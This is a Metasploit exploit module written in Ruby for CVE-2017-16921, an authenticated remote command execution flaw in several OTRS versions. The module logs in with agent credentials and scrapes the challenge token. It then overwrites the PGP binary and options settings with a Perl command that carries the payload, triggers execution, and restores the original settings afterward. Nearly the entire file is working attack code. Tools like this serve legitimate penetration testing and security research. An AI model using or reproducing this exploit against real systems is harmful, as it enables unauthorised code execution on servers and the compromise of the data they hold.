##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'OTRS PGP Settings Command Execution',
        'Description' => %q(
          In OTRS 6.0.x up to and including 6.0.1, OTRS 5.0.x up to and including 5.0.24, and OTRS 4.0.x up to and including 4.0.26,
          an attacker who is logged into OTRS as an agent can manipulate form parameters (related to PGP) and execute arbitrary
          shell commands with the permissions of the OTRS or web server user.
          ),
        'Author'      =>
          [
            'h00die', # module
            'BÃ¦ln0rn' # discovery
          ],
        'References'  =>
          [
            [ 'EDB', '43853' ],
            [ 'CVE', '2017-16921' ],
            [ 'URL', 'https://www.otrs.com/security-advisory-2017-09-security-update-otrs-framework/']
          ],
        'License'        => MSF_LICENSE,
        'Arch'           => ARCH_CMD,
        'Platform'       => ['linux', 'unix'],
        'Privileged'     => false,
        'DefaultOptions' => {'SSL' => false},
        'Payload' => {
          'Compat' => {
            'RequiredCmd' => 'perl'
          }
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Dec 05 2017'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with', '']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The path to the application', '/otrs/'])
      ], self.class
    )
  end

  def login
    # valid on version 4
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl'),
      'method'    => 'POST',
      'vars_post' => {
        'Action'       => 'Login',
        'RequestedURL' => '',
        'Lang'         => 'en',
        'TimeOffset'   => '300',
        'User'         => datastore['USERNAME'],
        'Password'     => datastore['PASSWORD']
      }
    )
    if res && res.code == 302
      vprint_good("Login Successful.  Cookie: #{res.get_cookies}")
      return res.get_cookies
    end
    vprint_bad('Invalid Login')
  end

  def poison(cookie, challengetoken, pgp, bin, options)
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl'),
      'method'    => 'POST',
      'vars_post' => {
        'ChallengeToken' => challengetoken,
        'Action' => 'AdminSysConfig',
        'Subaction' => 'Update',
        'SysConfigGroup' => 'Framework',
        'SysConfigSubGroup' => 'Crypt::PGP',
        'DontWriteDefault' => '1',
        'PGP' => pgp,
        'PGP::Bin' => bin,
        'PGP::Options' => options
      }
    )
    if res.code == 200
      vprint_error('Error saving values')
    end
  end

  def poison_pgp(cookie)
    # we can't use vars_get due to the request using ; instead of & to divide parameters, and it causing issues
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework'),
      'method'    => 'GET',
      'cookie'   => cookie,
    )
    #vprint_status(res.body)

    #need to get challenge token
    challengetoken = res.body.match(/name="ChallengeToken" value="(?<challengetoken>[a-z0-9]+)"/i)
    if challengetoken
      challengetoken = challengetoken['challengetoken']
      vprint_status("Challenge: #{challengetoken}")
    end

    #if pgp was on or off before
    options = res.body.match(/<select id="PGP" name="PGP">(?<options>.+)<\/select>/m)
    if options
      pgpon = options['options'].match(/<option value="(?<pgpon>[01])" selected="selected">/)
      if pgpon
        pgpon = pgpon['pgpon']
        vprint_status("PGP turned on: #{pgpon}")
      end
    end

    # bin
    pgpexec = res.body.match(/name="PGP::Bin" value="(?<pgpexec>.+)" title/)
    if pgpexec
      pgpexec = pgpexec['pgpexec']
      vprint_status("PGP binary: #{pgpexec}")
    end

    # options
    options = res.body.match(/name="PGP::Options" value="(?<options>.+)" title=".+" \/>/)
    if options
      options = options['options']
      vprint_status("PGP options: #{options}")
    end

    return unless options && pgpexec && pgpon && challengetoken

    vprint_status('Poisoning PGP parameters')
    poison(cookie, challengetoken, '1', '/usr/bin/perl', " -e '#{payload.encoded}'")
    print('Triggering Exploit')
    send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl'),
      'method'    => 'GET',
      'vars_get' => {
        'Action'       => 'AdminPGP',
      }
    )
    print('Resetting PGP parameters')
    # get a new challenge
    res = send_request_cgi(
      'uri'       => normalize_uri(target_uri.path, 'index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework'),
      'method'    => 'GET',
      'cookie'   => cookie,
    )
    #need to get challenge token
    challengetoken = res.body.match(/name="ChallengeToken" value="(?<challengetoken>[a-z0-9]+)"/i)
    if challengetoken
      challengetoken = challengetoken['challengetoken']
      vprint_status("Challenge: #{challengetoken}")
    end

    poison(cookie, challengetoken, pgpon, pgpexec, options)

#PGP::Key::PasswordKey[]=488A0B8F
#PGP::Key::PasswordContent[]=SomePassword
#PGP::Key::PasswordDeleteNumber[]=1
#PGP::Key::PasswordKey[]=D2DF79FA
#PGP::Key::PasswordContent[]=SomePassword
#PGP::Key::PasswordDeleteNumber[]=2
#PGP::TrustedNetworkItemActive=1
#PGP::TrustedNetwork=0
#PGP::LogKey[]=BADSIG
#PGP::LogContent[]=The+PGP+signature+with+the+keyid+has+not+been+verified+successfully.
#PGP::LogDeleteNumber[]=1
#PGP::LogKey[]=ERRSIG
#PGP::LogContent[]=It+was+not+possible+to+check+the+PGP+signature%2C+this+may+be+caused+by+a+missing+public+key+or+an+unsupported+algorithm.
#PGP::LogDeleteNumber[]=2
#PGP::LogKey[]=EXPKEYSIG
#PGP::LogContent[]=The+PGP+signature+was+made+by+an+expired+key.
#PGP::LogDeleteNumber[]=3
#PGP::LogKey[]=GOODSIG
#PGP::LogContent[]=Good+PGP+signature.
#PGP::LogDeleteNumber[]=4
#PGP::LogKey[]=KEYREVOKED
#PGP::LogContent[]=The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.
#PGP::LogDeleteNumber[]=5
#PGP:LogKey[]=NODATA
#PGP::LogContent[]=No+valid+OpenPGP+data+found.
#PGP::LogDeleteNumber[]=6
#PGP::LogKey[]=NO_PUBKEY
#PGP::LogContent[]=No+public+key+found.
#PGP::LogDeleteNumber[]=7
#PGP::LogKey[]=REVKEYSIG
#PGP::LogContent[]=The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.
#PGP::LogDeleteNumber[]=8
#PGP::LogKey[]=SIGEXPIRED
#PGP::LogContent[]=The+PGP+signature+is+expired.
#PGP::LogDeleteNumber[]=9
#PGP::LogKey[]=SIG_ID
#PGP::LogContent[]=Signature+data.
#PGP::LogDeleteNumber[]=10
#PGP::LogKey[]=TRUST_UNDEFINED
#PGP::LogContent[]=This+key+is+not+certified+with+a+trusted+signature%21.
#PGP::LogDeleteNumber[]=11
#PGP::LogKey[]=VALIDSIG
#PGP::LogContent[]=The+PGP+signature+with+the+keyid+is+good.
#PGP::LogDeleteNumber[]=12
#PGP::StoreDecryptedData=1

  end

  def exploit
    cookie = login
    if cookie
      poison_pgp(cookie)
    end
  end

#  def on_new_session(session)
#    super
#    session.shell_command_token('setsid $SHELL')
#  end
end
